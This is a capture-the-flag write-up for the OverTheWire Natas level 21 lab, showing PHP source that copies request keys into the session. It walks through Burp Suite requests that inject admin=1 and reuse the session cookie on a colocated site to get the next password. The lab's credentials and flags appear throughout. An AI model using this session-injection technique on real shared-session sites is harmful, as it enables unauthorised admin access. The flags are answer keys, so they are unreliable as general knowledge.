# Natas Level 20 → Level 21 Virtual Host Misconfiguration and Session Mismanagement/Fixation
# Cross site scripting (XSS)

## Previous Flag
<b>BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</b><br>

| **Variable**   | **Purpose**                                | **Scope**                        | **Used On**      |
|----------------|---------------------------------------------|----------------------------------|------------------|
| `$_GET`        | URL query parameters (e.g., `?id=5`)        | Server reads from client         | Server           |
| `$_POST`       | Form POST data                              | Server reads from client         | Server           |
| `$_COOKIE`     | Cookies sent by browser                     | Client-controlled                | Both (set by server, sent by client) |
| `$_SESSION`    | Session data on server                      | Server-controlled                | Server           |
| `$_SERVER`     | Server/environment info                     | Server-side                      | Server           |
| `$_FILES`      | Uploaded files                              | Server receives from client      | Server           |

## What I learned
```
Both interfaces share same session store, but don’t properly validate who should have access to which session data
Hacker can set up or fix a session with elevated permissions and then use it on another interface
Always validate permissions on the server-side for each application, even if they share sessions. Never trust another interface to enforce security for you.

PHP session info is stored in files on server and able to inject admin=1 data into $_SESSION variable on one site, then immediately request a page from other site using same PHPSESSID

$_SESSION is a server-side variable, because PHP runs on the server
```

## Goal
Username: natas21<br>
URL: http://natas21.natas.labs.overthewire.org<br>

Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.

![alt text](/static/colocated.png "Colocated")

## Solution
```
View Source Code from http://natas21.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "<censored>" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 👀
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

View Source Code from http://natas21-experimenter.natas.labs.overthewire.org/index-source.html

<html>
<head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
<?php

session_start();

// if update was submitted, store it 
if(array_key_exists("submit", $_REQUEST)) { 👀
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow"); 👀
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Open Burp Suite: Temporary project in memory: Use Burp defaults
# Proxy → Open browser: http://natas21-experimenter.natas.labs.overthewire.org/index.php
# Proxy → Intercept on
# Burp Browser click Update
# Right click Request and select Send to 
# Repeater and add &admin=1
    Original:   align=center&fontsize=100%25&bgcolor=yellow&submit=Update
    Modfied:    align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update
# Add ?debug on end of /index.php in Request POST
    POST /index.php?debug HTTP/1.1 👀
    Host: natas21-experimenter.natas.labs.overthewire.org
    Content-Length: 65
    Cache-Control: max-age=0
    Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
    Accept-Language: en-US,en;q=0.9
    Origin: http://natas21-experimenter.natas.labs.overthewire.org
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://natas21-experimenter.natas.labs.overthewire.org/index.php
    Accept-Encoding: gzip, deflate, br
    Cookie: PHPSESSID=khutiibnrqqar0p50fm87bb72h ⭐
    Connection: keep-alive

    align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update 👀
# Send and look at Response
    HTTP/1.1 200 OK
    Date: Wed, 06 Aug 2025 19:54:46 GMT
    Server: Apache/2.4.58 (Ubuntu)
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Vary: Accept-Encoding
    Content-Length: 994
    Keep-Alive: timeout=5, max=100
    Connection: Keep-Alive
    Content-Type: text/html; charset=UTF-8

    <html>
    <head><link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"></head>
    <body>
    <h1>natas21 - CSS style experimenter</h1>
    <div id="content">
    <p>
    <b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
    </p>
    [DEBUG] Session contents:<br>Array
    (
        [debug] => 
        [align] => center
        [fontsize] => 100%
        [bgcolor] => yellow
        [admin] => 1 👀
        [submit] => Update
    )

    <p>Example:</p>
    <div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
    <p>Change example values here:</p>
    <form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
    <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
    </body>
    </html>
# IMPORTANT: Make same changes (on Response the ?debug & admin=1) back on Proxy and FORWARD ⭐⭐⭐⭐⭐ (Look Burp Browser)
# Make a GET request to http://natas21.natas.labs.overthewire.org/index.php?debug using same PHPSESSID
    Make new request in browser and send to Repeater using Cookie: PHPSESSID=khutiibnrqqar0p50fm87bb72h
# Burp Browser: http://natas21.natas.labs.overthewire.org
# Send to Repeater or FORWARD (Look Burp Browser w/ changed cookie)
# Edit Cookie: PHPSESSID=<random> to other khutiibnrqqar0p50fm87bb72h

HTTP/1.1 200 OK
Date: Wed, 06 Aug 2025 21:08:34 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1203
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</pre> 🔐
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Flag
<b>d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz</b>

## Continue
[Continue](/overthewire/Natas2122.md)